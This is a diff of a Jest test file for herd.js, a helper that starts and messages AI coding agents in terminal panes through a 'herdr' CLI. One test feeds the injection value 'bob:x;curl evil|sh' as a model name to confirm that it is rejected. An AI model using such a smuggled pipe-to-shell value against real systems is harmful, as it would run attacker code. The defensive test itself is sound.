@@ -11,10 +11,6 @@ const AGENTS = {
   },
 };
 
-const WORKTREE = {
-  result: { worktree: { open_workspace_id: 'w7', path: '/wt/x' }, root_pane: { pane_id: 'w7:p1' } },
-};
-
 describe('pane', () => {
   test('returns pane_id for a handle', () => {
     expect(h.pane(AGENTS, 'jay')).toBe('w1:p2');
@@ -38,27 +34,12 @@ describe('members', () => {
   });
 });
 
-describe('field', () => {
-  test('extracts a dot path', () => {
-    expect(h.field(WORKTREE, 'result.worktree.open_workspace_id')).toBe('w7');
-  });
-  test('nested', () => {
-    expect(h.field(WORKTREE, 'result.root_pane.pane_id')).toBe('w7:p1');
-  });
-  test('undefined for missing path', () => {
-    expect(h.field(WORKTREE, 'result.nope.x')).toBeUndefined();
-  });
-});
-
 describe('submitKeys', () => {
   test('codex panes get two Enters', () => {
     expect(h.submitKeys(AGENTS, 'jay')).toEqual(['Enter', 'Enter']);
   });
   test('non-codex panes get one Enter', () => {
     expect(h.submitKeys(AGENTS, 'sly')).toEqual(['Enter']);
-  });
-  test('can resolve by pane_id', () => {
-    expect(h.submitKeys(AGENTS, 'w1:p2')).toEqual(['Enter', 'Enter']);
   });
   test('unknown target returns no keys', () => {
     expect(h.submitKeys(AGENTS, 'nope')).toEqual([]);
@@ -74,41 +55,29 @@ describe('format', () => {
   test('scalars stringified', () => { expect(h.format('w7')).toBe('w7'); });
 });
 
-describe('dispatch', () => {
-  test('routes members --workspace', () => {
-    expect(h.dispatch(['members', '--workspace', 'w2'], AGENTS)).toEqual(['tim']);
+// The helper is stdin-free: every verb fetches its own state via `herdr`.
+describe('dispatch (self-contained verbs)', () => {
+  const deps = () => {
+    const calls = [];
+    return { calls, deps: { run: (f, a) => { calls.push([f, ...a]); return JSON.stringify(AGENTS); } } };
+  };
+
+  test('status fetches the agent list itself', () => {
+    const { calls, deps: d } = deps();
+    expect(h.dispatch(['status', 'tim'], d)).toBe('done');
+    expect(calls).toEqual([['herdr', 'agent', 'list']]);
   });
-  test('routes submit-keys', () => {
-    expect(h.dispatch(['submit-keys', 'jay'], AGENTS)).toEqual(['Enter', 'Enter']);
+  test('members --workspace fetches and filters', () => {
+    const { deps: d } = deps();
+    expect(h.dispatch(['members', '--workspace', 'w2'], d)).toEqual(['tim']);
+  });
+  test('removed verbs (pane/field/submit-keys) are unknown commands', () => {
+    for (const verb of [['pane', 'jay'], ['field', 'result.x'], ['submit-keys', 'jay']]) {
+      expect(() => h.dispatch(verb, deps().deps)).toThrow(/unknown command/);
+    }
   });
   test('throws on unknown command', () => {
-    expect(() => h.dispatch(['bogus'], AGENTS)).toThrow(/unknown command/);
-  });
-});
-
-describe('loadAgentList (self-exec fallback)', () => {
-  test('uses piped data when present, never calling run (TTY/no-fetch path)', () => {
-    let called = false;
-    const deps = { run: () => { called = true; return '{}'; } };
-    expect(h.loadAgentList(AGENTS, deps)).toBe(AGENTS);
-    expect(called).toBe(false);
-  });
-  test('runs `herdr agent list` when stdin data is empty (no-stdin path)', () => {
-    const calls = [];
-    const deps = { run: (f, a) => { calls.push([f, ...a]); return JSON.stringify(AGENTS); } };
-    const out = h.loadAgentList({}, deps);
-    expect(calls).toEqual([['herdr', 'agent', 'list']]);
-    expect(h.pane(out, 'jay')).toBe('w1:p2');
-  });
-  test('with neither stdin nor a runner, returns the input untouched', () => {
-    expect(h.loadAgentList({}, undefined)).toEqual({});
-  });
-});
-
-describe('dispatch self-exec', () => {
-  test('status with empty stdin fetches the list via run', () => {
-    const deps = { run: () => JSON.stringify(AGENTS) };
-    expect(h.dispatch(['status', 'tim'], {}, deps)).toBe('done');
+    expect(() => h.dispatch(['bogus'], deps().deps)).toThrow(/unknown command/);
   });
 });
 
@@ -151,49 +120,69 @@ describe('resolveSelf', () => {
   test('override wins over everything', () => {
     expect(h.resolveSelf(DATA, 'kris', { HERDR_PANE_ID: 'w1M:p5' })).toBe('kris');
   });
-
   test('resolves the executing pane from HERDR_PANE_ID, not the focused agent', () => {
     expect(h.resolveSelf(DATA, undefined, { HERDR_PANE_ID: 'w1M:p5' })).toBe('paul');
   });
-
   test('falls back to the focused agent when HERDR_PANE_ID is absent', () => {
     expect(h.resolveSelf(DATA, undefined, {})).toBe('cal');
   });
-
   test('falls back to the focused agent when HERDR_PANE_ID matches no agent', () => {
     expect(h.resolveSelf(DATA, undefined, { HERDR_PANE_ID: 'w9:p9' })).toBe('cal');
   });
 });
 
+// Deterministic send: type -> confirm the composer ingested the text
+// (wait output) -> submit keys -> confirm the turn started (agent wait).
 describe('sendCmd', () => {
-  // Recipient statuses are served one per `agent list` call so tests can
-  // script the idle->working transition that the submit verification polls for.
-  function runner({ focused, statuses = ['idle'] } = {}) {
+  // statuses: sequence served by successive `agent list` calls
+  // ingest: 'ok' | 'timeout' (wait output result)
+  // turns: per-attempt `agent wait --status working` results, 'ok' | 'timeout'
+  function runner({ focused, statuses = ['idle'], ingest = 'ok', turns = ['ok'] } = {}) {
     const calls = [];
-    let i = 0;
+    let li = 0;
+    let ti = 0;
     const list = () => {
-      const st = statuses[Math.min(i++, statuses.length - 1)];
+      const st = statuses[Math.min(li++, statuses.length - 1)];
       return JSON.stringify({ result: { agents: [
         { name: 'jay', agent: 'claude', pane_id: 'w1:p2', agent_status: st },
         { name: 'sly', agent: 'claude', pane_id: 'w1:p1', focused: !!focused },
         { name: 'cod', agent: 'codex', pane_id: 'w1:p3', agent_status: st },
       ] } });
     };
-    const run = (f, a) => { calls.push([f, ...a]); return (a[0] === 'agent' && a[1] === 'list') ? list() : ''; };
+    const run = (f, a) => {
+      calls.push([f, ...a]);
+      if (a[0] === 'agent' && a[1] === 'list') return list();
+      if (a[0] === 'wait' && a[1] === 'output') {
+        if (ingest === 'timeout') throw new Error('wait timeout');
+        return '';
+      }
+      if (a[0] === 'agent' && a[1] === 'wait') {
+        const r = turns[Math.min(ti++, turns.length - 1)];
+        if (r === 'timeout') throw new Error('wait timeout');
+        return '';
+      }
+      return '';
+    };
     const submits = () => calls.filter((c) => c[1] === 'pane' && c[2] === 'send-keys');
-    return { deps: { run, sleep: () => {}, env: {} }, calls, submits };
+    return { deps: { run, env: {} }, calls, submits };
   }
 
-  test('plain send: resolve pane, send, Enter, then verify via status poll', () => {
-    const { deps, calls, submits } = runner({ statuses: ['idle', 'idle', 'idle', 'working'] });
+  test('happy path: exact deterministic sequence, no polling', () => {
+    const { deps, calls } = runner();
     expect(h.sendCmd(['jay', 'rerun the test'], deps))
       .toEqual({ result: { type: 'ok' }, pane: 'w1:p2', sent: 'rerun the test', submitted: true });
-    expect(calls).toContainEqual(['herdr', 'agent', 'send', 'jay', 'rerun the test']);
-    expect(submits()).toEqual([['herdr', 'pane', 'send-keys', 'w1:p2', 'Enter']]);
+    expect(calls).toEqual([
+      ['herdr', 'agent', 'list'],
+      ['herdr', 'agent', 'send', 'jay', 'rerun the test'],
+      ['herdr', 'wait', 'output', 'w1:p2', '--match', 'test',
+        '--source', 'recent-unwrapped', '--timeout', '2000'],
+      ['herdr', 'pane', 'send-keys', 'w1:p2', 'Enter'],
+      ['herdr', 'agent', 'wait', 'jay', '--status', 'working', '--timeout', '4000'],
+    ]);
   });
 
   test('codex recipient gets two Enters via submitKeys', () => {
-    const { deps, submits } = runner({ statuses: ['idle', 'idle', 'idle', 'working'] });
+    const { deps, submits } = runner();
     h.sendCmd(['cod', 'hello'], deps);
     expect(submits()).toEqual([
       ['herdr', 'pane', 'send-keys', 'w1:p3', 'Enter'],
@@ -201,46 +190,58 @@ describe('sendCmd', () => {
     ]);
   });
 
-  test('dropped submit is retried until the recipient starts working', () => {
-    // attempt 1: all 4 polls stay idle (Enter was swallowed); attempt 2 lands.
-    const statuses = ['idle', 'idle', 'idle', 'idle', 'idle', 'idle', 'idle', 'working'];
-    const { deps, submits } = runner({ statuses });
-    expect(h.sendCmd(['cod', 'hello'], deps).submitted).toBe(true);
-    expect(submits()).toHaveLength(4); // 2 Enters x 2 attempts
+  // Recipient composers re-wrap long bodies with real newlines + indent, so
+  // only a whitespace-free fragment is guaranteed to survive wrapping intact.
+  test('ingest match uses the body last token, never a fragment with spaces', () => {
+    const { deps, calls } = runner();
+    h.sendCmd(['jay', '[from sly reply] please rerun the suite in src/api-v2'], deps);
+    const wait = calls.find((c) => c[1] === 'wait' && c[2] === 'output');
+    expect(wait[5]).toBe('src/api-v2');
   });
 
-  test('reports submitted:false when the recipient never starts working', () => {
-    const { deps, submits } = runner({ statuses: ['idle'] });
-    expect(h.sendCmd(['cod', 'hello'], deps).submitted).toBe(false);
-    expect(submits()).toHaveLength(6); // 2 Enters x 3 attempts, then give up
+  test('an overlong last token is capped at its final 40 characters', () => {
+    const token = 'a'.repeat(30) + 'b'.repeat(30);
+    const { deps, calls } = runner();
+    h.sendCmd(['jay', `see ${token}`], deps);
+    const wait = calls.find((c) => c[1] === 'wait' && c[2] === 'output');
+    expect(wait[5]).toBe(token.slice(-40));
+    expect(wait[5]).toHaveLength(40);
   });
 
-  test('fast turn (idle->done between polls) still counts as submitted', () => {
-    const { deps, submits } = runner({ statuses: ['idle', 'idle', 'idle', 'done'] });
+  test('ingest confirm timing out does not abort the submit', () => {
+    const { deps, submits } = runner({ ingest: 'timeout' });
+    expect(h.sendCmd(['jay', 'hi'], deps).submitted).toBe(true);
+    expect(submits()).toHaveLength(1);
+  });
+
+  test('fast turn: agent wait misses but the status changed -> submitted, no retry', () => {
+    // wait times out; the follow-up list shows idle -> done
+    const { deps, submits } = runner({ statuses: ['idle', 'done'], turns: ['timeout'] });
     expect(h.sendCmd(['jay', 'quick one'], deps).submitted).toBe(true);
     expect(submits()).toHaveLength(1);
   });
 
+  test('dropped submit is retried once, then reported submitted:false', () => {
+    const { deps, submits } = runner({ statuses: ['idle'], turns: ['timeout', 'timeout'] });
+    expect(h.sendCmd(['cod', 'hello'], deps).submitted).toBe(false);
+    expect(submits()).toHaveLength(4); // 2 Enters x 2 attempts, no further polling
+  });
+
   test('--reply --from stamps the compact protocol header', () => {
-    const { deps, calls } = runner({ statuses: ['working'] });
+    const { deps, calls } = runner();
     expect(h.sendCmd(['jay', 'status?', '--reply', '--from', 'sly'], deps).sent)
       .toBe('[from sly reply] status?');
     expect(calls).toContainEqual(['herdr', 'agent', 'send', 'jay', '[from sly reply] status?']);
   });
 
   test('--fyi resolves <self> from the executing pane, not the focused agent', () => {
-    const { deps } = runner({ focused: true, statuses: ['working'] }); // focus drifted to sly
-    deps.env = { HERDR_PANE_ID: 'w1:p2' }; // but jay is running the send
+    const { deps } = runner({ focused: true });
+    deps.env = { HERDR_PANE_ID: 'w1:p2' }; // jay is running the send
     expect(h.sendCmd(['cod', 'heads up', '--fyi'], deps).sent).toBe('[from jay fyi] heads up');
   });
 
-  test('--fyi falls back to the focused agent when --from and HERDR_PANE_ID are absent', () => {
-    const { deps } = runner({ focused: true, statuses: ['working'] }); // sly is focused
-    expect(h.sendCmd(['jay', 'heads up', '--fyi'], deps).sent).toBe('[from sly fyi] heads up');
-  });
-
   test('does not double-prefix an already [from ...] message', () => {
-    const { deps } = runner({ focused: true, statuses: ['working'] });
+    const { deps } = runner({ focused: true });
     expect(h.sendCmd(['jay', '[from sly reply] hi', '--reply'], deps).sent).toBe('[from sly reply] hi');
   });
 
@@ -250,9 +251,8 @@ describe('sendCmd', () => {
   });
 
   test('--reply with no focused agent and no --from throws (no silent mis-stamp)', () => {
-    const { deps } = runner(); // no agent is focused
-    expect(() => h.sendCmd(['jay', 'hi', '--reply'], deps))
-      .toThrow(/cannot resolve sender handle/);
+    const { deps } = runner();
+    expect(() => h.sendCmd(['jay', 'hi', '--reply'], deps)).toThrow(/cannot resolve sender handle/);
   });
 
   test('--from without a value throws instead of being silently ignored', () => {
@@ -289,8 +289,11 @@ describe('sendWaitReadCmd', () => {
   });
 });
 
+// agent verb: tab create -> agent start --tab (named at start, no wait/rename)
+// -> close the leftover tab root pane -> wait until the agent is ready.
 describe('agentCmd', () => {
   const TAB = JSON.stringify({ result: { tab: { tab_id: 'wR:t2' }, root_pane: { pane_id: 'wR:p2' } } });
+  const START = JSON.stringify({ result: { agent: { pane_id: 'wR:p9', name: 'jay', tab_id: 'wR:t2' } } });
   function runner(existing = []) {
     const calls = [];
     const run = (f, a) => {
@@ -298,21 +301,23 @@ describe('agentCmd', () => {
       if (a[0] === 'agent' && a[1] === 'list') {
         return JSON.stringify({ result: { agents: existing.map((name) => ({ name })) } });
       }
-      return (a[0] === 'tab' && a[1] === 'create') ? TAB : '';
+      if (a[0] === 'tab' && a[1] === 'create') return TAB;
+      if (a[0] === 'agent' && a[1] === 'start') return START;
+      return '';
     };
     return { run, calls };
   }
 
-  test('codex agent: preflight, tab create -> run -> wait -> rename', () => {
+  test('codex agent: preflight, tab create -> agent start --tab -> close root -> wait idle', () => {
     const { run, calls } = runner();
     const out = h.agentCmd(['codex', 'jay', '--workspace', 'wR', '--cwd', '/wt/x'], { run });
-    expect(out).toEqual({ handle: 'jay', model: 'codex', pane_id: 'wR:p2', tab: 'wR:t2' });
+    expect(out).toEqual({ handle: 'jay', model: 'codex', pane_id: 'wR:p9', tab: 'wR:t2' });
     expect(calls).toEqual([
       ['herdr', 'agent', 'list'],
       ['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x', '--label', 'jay ◇', '--no-focus'],
-      ['herdr', 'pane', 'run', 'wR:p2', 'codex'],
-      ['herdr', 'wait', 'agent-status', 'wR:p2', '--status', 'idle', '--timeout', '45000'],
-      ['herdr', 'agent', 'rename', 'wR:p2', 'jay'],
+      ['herdr', 'agent', 'start', 'jay', '--tab', 'wR:t2', '--cwd', '/wt/x', '--no-focus', '--', 'codex'],
+      ['herdr', 'pane', 'close', 'wR:p2'],
+      ['herdr', 'agent', 'wait', 'jay', '--status', 'idle', '--timeout', '45000'],
     ]);
   });
 
@@ -323,10 +328,10 @@ describe('agentCmd', () => {
     expect(calls.some((c) => c[1] === 'tab' && c[2] === 'create')).toBe(false);
   });
 
-  test('--timeout overrides the idle wait', () => {
+  test('--timeout overrides the readiness wait', () => {
     const { run, calls } = runner();
     h.agentCmd(['claude', 'sly', '--workspace', 'wR', '--cwd', '/wt/x', '--timeout', '9000'], { run });
-    expect(calls).toContainEqual(['herdr', 'wait', 'agent-status', 'wR:p2', '--status', 'idle', '--timeout', '9000']);
+    expect(calls).toContainEqual(['herdr', 'agent', 'wait', 'sly', '--status', 'idle', '--timeout', '9000']);
   });
 
   test('missing --cwd throws', () => {
@@ -335,20 +340,19 @@ describe('agentCmd', () => {
       .toThrow(/--workspace and --cwd are required/);
   });
 
-  test('opencode agent runs the sanitized model argv', () => {
+  test('opencode agent starts with the argv vector (no shell string)', () => {
     const { run, calls } = runner();
-    const out = h.agentCmd(['opencode', 'bob:ollama/qwen2.5:7b', '--workspace', 'wR', '--cwd', '/wt/x'], { run });
-    expect(out).toEqual({ handle: 'bob', model: 'opencode', pane_id: 'wR:p2', tab: 'wR:t2' });
-    expect(calls).toContainEqual(['herdr', 'pane', 'run', 'wR:p2', 'opencode -m ollama/qwen2.5:7b']);
+    h.agentCmd(['opencode', 'bob:ollama/qwen2.5:7b', '--workspace', 'wR', '--cwd', '/wt/x'], { run });
     expect(calls).toContainEqual(
-      ['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x', '--label', 'bob ⬨', '--no-focus']);
+      ['herdr', 'agent', 'start', 'bob', '--tab', 'wR:t2', '--cwd', '/wt/x', '--no-focus',
+        '--', 'opencode', '-m', 'ollama/qwen2.5:7b']);
   });
 
   test('opencode agent with an unsafe model is rejected before any herdr call', () => {
     const { run, calls } = runner();
     expect(() => h.agentCmd(['opencode', 'bob:x;curl evil|sh', '--workspace', 'wR', '--cwd', '/wt/x'], { run }))
       .toThrow(/unsafe characters/);
-    expect(calls).toEqual([]); // makeAgent throws before the preflight list or tab create
+    expect(calls).toEqual([]);
   });
 });
 
@@ -362,31 +366,21 @@ describe('defaultDeps', () => {
   });
 });
 
-describe('dispatch routes action verbs', () => {
-  test('routes wait through waitCmd', () => {
-    const deps = {
-      run: () => JSON.stringify({ result: { agents: [{ name: 'jay', agent_status: 'idle' }] } }),
-      sleep: () => {}, now: () => 0,
-    };
-    expect(h.dispatch(['wait', 'jay'], {}, deps)).toBe('idle');
-  });
-  test('unknown verb still throws', () => {
-    expect(() => h.dispatch(['bogus'], {}, {})).toThrow(/unknown command/);
-  });
-});
-
 describe('usage / --help', () => {
   test('send --help prints usage instead of resolving --help as a handle', () => {
     const calls = [];
     const deps = { run: (f, a) => { calls.push([f, ...a]); return '{}'; } };
-    const out = h.dispatch(['send', '--help'], {}, deps);
+    const out = h.dispatch(['send', '--help'], deps);
     expect(out).toMatch(/usage: herd\.js/);
-    expect(calls).toEqual([]); // short-circuits before `herdr agent list`
+    expect(calls).toEqual([]); // short-circuits before any herdr call
   });
   test('bare --help, -h, and no verb print usage', () => {
-    expect(h.dispatch(['--help'], {}, {})).toMatch(/usage: herd\.js/);
-    expect(h.dispatch(['-h'], {}, {})).toMatch(/usage: herd\.js/);
-    expect(h.dispatch([], {}, {})).toMatch(/usage: herd\.js/);
+    expect(h.dispatch(['--help'], {})).toMatch(/usage: herd\.js/);
+    expect(h.dispatch(['-h'], {})).toMatch(/usage: herd\.js/);
+    expect(h.dispatch([], {})).toMatch(/usage: herd\.js/);
+  });
+  test('usage no longer documents stdin or piping', () => {
+    expect(h.usage()).not.toMatch(/stdin|pipe/i);
   });
   test('usage warns that the native wait takes a single status, not a comma list', () => {
     expect(h.usage()).toMatch(/herdr wait agent-status.*one\b/i);
@@ -395,8 +389,9 @@ describe('usage / --help', () => {
 
 describe('herd.js main wiring (child process)', () => {
   const path = require('path');
-  const { execFileSync } = require('child_process');
+  const { execFileSync, spawn } = require('child_process');
   const HERD = path.join(__dirname, '..', 'skills', 'herdr', 'scripts', 'herd.js');
+
   test('unknown verb exits non-zero with a stderr diagnostic (deps wired)', () => {
     let err;
     try {
@@ -409,5 +404,29 @@ describe('herd.js main wiring (child process)', () => {
   test('send --help exits 0 with usage on stdout', () => {
     const out = execFileSync('node', [HERD, 'send', '--help'], { encoding: 'utf8', stdio: 'pipe', input: '' });
     expect(out).toMatch(/usage: herd\.js/);
+  });
+
+  // Harnesses like the Claude Code Bash tool keep the child's stdin open (a
+  // socket that never sends EOF). The helper must never read stdin, so every
+  // verb dispatches immediately.
+  function exitsWithStdinOpen(argv) {
+    // PATH without herdr: dispatch fails fast (ENOENT) instead of touching a
+    // live server, so the only way this test times out is a stdin read.
+    const child = spawn(process.execPath, [HERD, ...argv], {
+      stdio: ['pipe', 'ignore', 'pipe'],
+      env: { ...process.env, PATH: '/usr/bin:/bin' },
+    });
+    // deliberately never close child.stdin
+    return new Promise((resolve) => {
+      const timer = setTimeout(() => { child.kill('SIGKILL'); resolve(false); }, 4000);
+      child.on('exit', () => { clearTimeout(timer); resolve(true); });
+    });
+  }
+
+  test('action verbs dispatch without waiting for stdin EOF', async () => {
+    expect(await exitsWithStdinOpen(['send', 'no-such-agent', 'hi'])).toBe(true);
+  });
+  test('read verbs dispatch without waiting for stdin EOF (stdin is never read)', async () => {
+    expect(await exitsWithStdinOpen(['status', 'no-such-agent'])).toBe(true);
   });
 });
